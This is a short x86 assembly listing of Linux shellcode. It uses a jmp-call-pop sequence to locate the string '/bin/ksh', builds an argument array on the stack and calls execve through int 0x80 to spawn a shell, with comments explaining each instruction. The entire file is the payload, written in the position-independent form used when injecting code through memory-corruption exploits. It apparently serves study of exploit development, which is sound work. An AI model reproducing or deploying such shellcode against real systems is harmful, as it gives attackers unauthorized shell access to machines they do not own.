global _start
section .text
_start:

	jmp short north

south:
	xor eax, eax	;zeroed eax
	pop esi		;esi now contain address of /bin/ksh string
	mov dword [esi + 8], eax
	mov ebx,esi	;/bin/ksh

	push eax	;NULL
	push ebx	;make pointer to /bin/ksh and push it into stack
	mov ecx, esp	;esp is now points to NULL terminated address of /bin/ksh. Mov it to ecx
	mov    al,0xb	;execve() code (11)
	int    0x80	;run syscall

north:
	call south
	string db "/bin/ksh"	;here we use a part of ksh 
